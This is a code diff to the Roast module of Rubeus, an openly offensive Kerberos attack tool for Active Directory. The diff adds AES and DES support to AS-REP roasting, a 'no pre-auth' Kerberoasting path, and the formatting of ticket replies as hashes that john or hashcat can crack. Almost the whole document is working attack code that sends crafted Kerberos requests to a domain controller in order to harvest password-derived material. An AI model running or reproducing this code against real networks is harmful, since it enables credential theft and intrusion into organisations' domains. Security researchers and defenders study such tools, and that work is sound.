@@ -13,7 +13,7 @@ namespace Rubeus
 {
     public class Roast
     {
-        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false)
+        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false, string supportedEType = "rc4")
         {
             if (!String.IsNullOrEmpty(userName))
             {
@@ -37,7 +37,7 @@ namespace Rubeus
             if (!String.IsNullOrEmpty(userName) && !String.IsNullOrEmpty(domain) && !String.IsNullOrEmpty(domainController))
             {
                 // if we have a username, domain, and DC specified, we don't need to search for users and can roast directly
-                GetASRepHash(userName, domain, domainController, format, outFile);
+                GetASRepHash(userName, domain, domainController, format, outFile, supportedEType);
             }
             else
             {
@@ -76,10 +76,19 @@ namespace Rubeus
                 {
                     string samAccountName = (string)user["samaccountname"];
                     string distinguishedName = (string)user["distinguishedname"];
+                    Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)user["useraccountcontrol"];
                     Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
                     Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
+                    if ((userUAC & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
+                    {
+                        Console.WriteLine("[*] User supports DES!");
+                        if (!supportedEType.Equals("aes"))
+                        {
+                            supportedEType = "des";
+                        }
+                    }
 
-                    GetASRepHash(samAccountName, domain, domainController, format, outFile);
+                    GetASRepHash(samAccountName, domain, domainController, format, outFile, supportedEType);
                 }
             }
 
@@ -89,7 +98,7 @@ namespace Rubeus
             }
         }
 
-        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "")
+        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "", string supportedEType = "rc4")
         {
             // roast AS-REPs for users without pre-authentication enabled
 
@@ -97,21 +106,92 @@ namespace Rubeus
             if (String.IsNullOrEmpty(dcIP)) { return; }
 
             Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
-            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac).Encode().Encode();
 
-            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
-            if (response == null)
+            byte[] reqBytes;
+            byte[] response;
+            AsnElt responseAsn;
+            int responseTag;
+            string requestedEType;
+
+            // Specify RC4 as the encryption type by default, unless the /aes flag was provided
+            if (supportedEType == "rc4" || supportedEType == "des")
             {
+                Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.rc4_hmac;
+                requestedEType = "rc4";
+                if (supportedEType.Equals("des"))
+                {
+                    if (format == "john")
+                    {
+                        Console.WriteLine("[!] DES not supported for john format, please rerun with '/format:hashcat'");
+                        return;
+                    }
+                    etype = Interop.KERB_ETYPE.des_cbc_md5;
+                    requestedEType = "des";
+                }
+                reqBytes = AS_REQ.NewASReq(userName, domain, etype).Encode().Encode();
+                response = Networking.SendBytes(dcIP, 88, reqBytes);
+
+                if (response == null)
+                {
+                    return;
+                }
+
+                // decode the supplied bytes to an AsnElt object
+                //  false == ignore trailing garbage
+                responseAsn = AsnElt.Decode(response, false);
+
+                // check the response value
+                responseTag = responseAsn.TagValue;
+            }
+            else if (supportedEType == "aes")
+            {
+                Console.WriteLine("[*] Requesting AES128 (etype 17) as the encryption type");
+
+                // Attempt to use SHA128 (etype 17) first, then fall back to SHA256 (etype 18) if that doesn't work
+                reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.aes128_cts_hmac_sha1).Encode().Encode();
+                response = Networking.SendBytes(dcIP, 88, reqBytes);
+
+                if (response == null)
+                {
+                    return;
+                }
+
+                requestedEType = "aes128";
+
+                responseAsn = AsnElt.Decode(response, false);
+                responseTag = responseAsn.TagValue;
+
+                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
+                {
+                    // parse the response to an KRB-ERROR
+                    KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
+
+                    // Error code 14 (KDC_ERR_ETYPE_NOTSUPP) means that AES128 (etype 17) is not supported, try AES256 (etype 18) next
+                    if (error.error_code == 14)
+                    {
+                        Console.WriteLine("[*] AES128 (etype 17) is not supported, attempting AES256 (etype 18) next");
+
+                        reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.aes256_cts_hmac_sha1).Encode().Encode();
+                        response = Networking.SendBytes(dcIP, 88, reqBytes);
+
+                        if (response == null)
+                        {
+                            return;
+                        }
+
+                        requestedEType = "aes256";
+
+                        responseAsn = AsnElt.Decode(response, false);
+                        responseTag = responseAsn.TagValue;
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("No supported encryption types provided");
                 return;
             }
-
-            // decode the supplied bytes to an AsnElt object
-            //  false == ignore trailing garbage
-            AsnElt responseAsn = AsnElt.Decode(response, false);
-
-            // check the response value
-            int responseTag = responseAsn.TagValue;
-
+            
             if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
             {
                 Console.WriteLine("[+] AS-REQ w/o preauth successful!");
@@ -121,16 +201,51 @@ namespace Rubeus
 
                 // output the hash of the encrypted KERB-CRED in a crackable hash form
                 string repHash = BitConverter.ToString(rep.enc_part.cipher).Replace("-", string.Empty);
-                repHash = repHash.Insert(32, "$");
 
                 string hashString = "";
+                int checksumStart;
+
                 if (format == "john")
                 {
-                    hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
+                    if (requestedEType == "aes128")
+                    {
+                        checksumStart = repHash.Length - 24;
+                        hashString = String.Format("$krb5asrep$17${0}{1}${2}${3}", domain.ToUpper(), userName, repHash.Substring(0, checksumStart), repHash.Substring(checksumStart));
+                    }
+                    else if (requestedEType == "aes256")
+                    {
+                        checksumStart = repHash.Length - 24;
+                        hashString = String.Format("$krb5asrep$18${0}{1}${2}${3}", domain.ToUpper(), userName, repHash.Substring(0, checksumStart), repHash.Substring(checksumStart));
+                    }
+                    else
+                    {
+                        repHash = repHash.Insert(32, "$");
+                        hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
+                    }
                 }
                 else if (format == "hashcat")
                 {
-                    hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
+                    if (requestedEType == "aes128")
+                    {
+                        checksumStart = repHash.Length - 24;
+                        hashString = String.Format("$krb5asrep$17${0}${1}${2}${3}", userName, domain, repHash.Substring(checksumStart), repHash.Substring(0, checksumStart));
+                    }
+                    else if (requestedEType == "aes256")
+                    {
+                        checksumStart = repHash.Length - 24;
+                        hashString = String.Format("$krb5asrep$18${0}${1}${2}${3}", userName, domain, repHash.Substring(checksumStart), repHash.Substring(0, checksumStart));
+                    }
+                    else if (requestedEType == "des")
+                    {
+                        int wholeLength = 193 + (domain.Length * 2);
+                        byte[] knownPlain = { 0x79, 0x81, (byte)wholeLength, 0x30, 0x81, (byte)(wholeLength - 3), 0xA0, 0x13 };
+                        hashString = Crypto.FormDESHash(repHash, knownPlain);
+                    }
+                    else
+                    {
+                        repHash = repHash.Insert(32, "$");
+                        hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
+                    }
                 }
                 else
                 {
@@ -181,11 +296,15 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false)
+        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false, string nopreauth = null)
         {
             if (userStats)
             {
                 Console.WriteLine("[*] Listing statistics about target users, no ticket requests being performed.");
+            }
+            else if (!String.IsNullOrWhiteSpace(nopreauth))
+            {
+                Console.WriteLine(String.Format("[*] Using {0} without pre-auth to request service tickets", nopreauth));
             }
             else if (TGT != null)
             {
@@ -224,7 +343,12 @@ namespace Rubeus
             {
                 Console.WriteLine("\r\n[*] Target SPN             : {0}", spn);
 
-                if (TGT != null)
+                if (!String.IsNullOrWhiteSpace(nopreauth))
+                {
+                    // if /nopreauth is supplied, use the user account specified without pre-auth
+                    GetTGSRepHash(nopreauth, spn, spn, "DISTINGUISHEDNAME", outFile, simpleOutput, dc, domain, Interop.KERB_ETYPE.rc4_hmac);
+                }
+                else if (TGT != null)
                 {
                     // if a TGT .kirbi is supplied, use that for the request
                     //      this could be a passed TGT or if TGT delegation is specified
@@ -242,7 +366,12 @@ namespace Rubeus
                 {
                     Console.WriteLine("\r\n[*] Target SPN             : {0}", s);
 
-                    if (TGT != null)
+                    if (!String.IsNullOrWhiteSpace(nopreauth))
+                    {
+                        // if /nopreauth is supplied, use the user account specified without pre-auth
+                        GetTGSRepHash(nopreauth, s, s, "DISTINGUISHEDNAME", outFile, simpleOutput, dc, domain, Interop.KERB_ETYPE.rc4_hmac);
+                    }
+                    else if (TGT != null)
                     {
                         // if a TGT .kirbi is supplied, use that for the request
                         //      this could be a passed TGT or if TGT delegation is specified
@@ -499,6 +628,7 @@ namespace Rubeus
                             }
                             if (TGT != null)
                             {
+                                Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.subkey_keymaterial;
                                 // if a TGT .kirbi is supplied, use that for the request
                                 //      this could be a passed TGT or if TGT delegation is specified
 
@@ -510,28 +640,17 @@ namespace Rubeus
                                    )
                                 {
                                     // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
-                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
-                                    Helpers.RandomDelayWithJitter(delay, jitter);
-                                    if (!result && autoenterprise)
-                                    {
-                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
-                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
-                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, Interop.KERB_ETYPE.rc4_hmac);
-                                        Helpers.RandomDelayWithJitter(delay, jitter);
-                                    }
+                                    etype = Interop.KERB_ETYPE.rc4_hmac;
                                 }
-                                else
+                                
+                                bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, etype);
+                                Helpers.RandomDelayWithJitter(delay, jitter);
+                                if (!result && autoenterprise)
                                 {
-                                    // otherwise don't force RC4 - have all supported encryption types for opsec reasons
-                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);
+                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, etype);
                                     Helpers.RandomDelayWithJitter(delay, jitter);
-                                    if (!result && autoenterprise)
-                                    {
-                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
-                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
-                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc);
-                                        Helpers.RandomDelayWithJitter(delay, jitter);
-                                    }
                                 }
                             }
                             else
@@ -724,14 +843,19 @@ namespace Rubeus
         public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
             // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
-            string userDomain = "DOMAIN";
+            string tgtDomain = "DOMAIN";
 
-            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
+            // we can only roast tickets for the domain that we have a TGT for, first determine it's a TGT
+            string serviceName = TGT.tickets[0].sname.name_string[0];
+            if (!serviceName.Equals("krbtgt"))
             {
-                // extract the domain name from the distinguishedname
-                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
-                string domainDN = dnMatch.Groups["Domain"].ToString();
-                userDomain = domainDN.Replace("DC=", "").Replace(',', '.');
+                Console.WriteLine("[X] Unable to request service tickets without a TGT, please rerun and provide a TGT to '/ticket'.");
+                return false;
+            }
+            else
+            {
+                // always use the doamin that our TGT is for
+                tgtDomain = TGT.tickets[0].sname.name_string[1];
             }
             
             // extract out the info needed for the TGS-REQ request
@@ -742,20 +866,12 @@ namespace Rubeus
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
 
             // request the new service ticket
-            byte[] tgsBytes = null;
-            if (domain.ToLower() != userDomain.ToLower())
-            {
-                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false);
-            }
-            else
-            {
-                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, true);
-            }
+            byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false, false, null, tgtDomain);
 
             if (tgsBytes != null)
             {
                 KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
-                DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile, simpleOutput);
+                DisplayTGShash(tgsKirbi, true, userName, tgtDomain, outFile, simpleOutput);
                 Console.WriteLine();
                 return true;
             }
@@ -763,7 +879,68 @@ namespace Rubeus
             return false;
         }
 
-        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false)
+        public static bool GetTGSRepHash(string nopreauth, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, string domainController = "", string domain = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
+        {
+            AS_REQ NoPreAuthASREQ = AS_REQ.NewASReq(nopreauth, domain, requestEType, false, spn);
+            byte[] reqBytes = NoPreAuthASREQ.Encode().Encode();
+
+            string dcIP = Networking.GetDCIP(domainController, true, domain);
+            if (String.IsNullOrEmpty(dcIP)) { return false; }
+
+            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
+
+            if (response == null)
+            {
+                return false;
+            }
+
+            // decode the supplied bytes to an AsnElt object
+            AsnElt responseAsn = AsnElt.Decode(response);
+
+            // check the response value
+            int responseTag = responseAsn.TagValue;
+
+            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
+            {
+                // parse the response to an AS-REP
+                AS_REP rep = new AS_REP(responseAsn);
+
+                // now build the final KRB-CRED structure
+                KRB_CRED cred = new KRB_CRED();
+
+                // add the ticket
+                cred.tickets.Add(rep.ticket);
+
+                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
+
+                KrbCredInfo info = new KrbCredInfo();
+
+                // [1] prealm (domain)
+                info.prealm = domain;
+
+                // [2] pname (user)
+                info.pname.name_type = rep.cname.name_type;
+                info.pname.name_string = rep.cname.name_string;
+
+                // [8] srealm
+                info.srealm = domain;
+
+                // [9] sname
+                info.sname.name_type = NoPreAuthASREQ.req_body.sname.name_type;
+                info.sname.name_string = NoPreAuthASREQ.req_body.sname.name_string;
+
+                // add the ticket_info into the cred object
+                cred.enc_part.ticket_info.Add(info);
+
+                DisplayTGShash(cred, true, userName, domain, outFile, simpleOutput);
+
+                return true;
+            }
+
+            return false;
+        }
+
+        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false, string desPlainText = "")
         {
             // output the hash of the encrypted KERB-CRED service ticket in a kerberoast hash form
 
@@ -781,6 +958,10 @@ namespace Rubeus
                 int checksumStart = cipherText.Length - 24;
                 //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
                 hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
+            }
+            else if (encType == 3 && !string.IsNullOrWhiteSpace(desPlainText))
+            {
+                hash = Crypto.FormDESHash(cipherText, Helpers.StringToByteArray(desPlainText));
             }
             //if encType==23
             else
@@ -820,7 +1001,7 @@ namespace Rubeus
                             }
                             else
                             {
-                                Console.WriteLine("  Kerberoast Hash       :  {0}", line);
+                                Console.WriteLine("  Kerberoast Hash          :  {0}", line);
                             }
                         }
                         else
@@ -845,7 +1026,7 @@ namespace Rubeus
                     }
                     else
                     {
-                        Console.WriteLine("  Kerberoast Hash       :  {0}", hash);
+                        Console.WriteLine("  Kerberoast Hash          :  {0}", hash);
                     }
                 }
             }
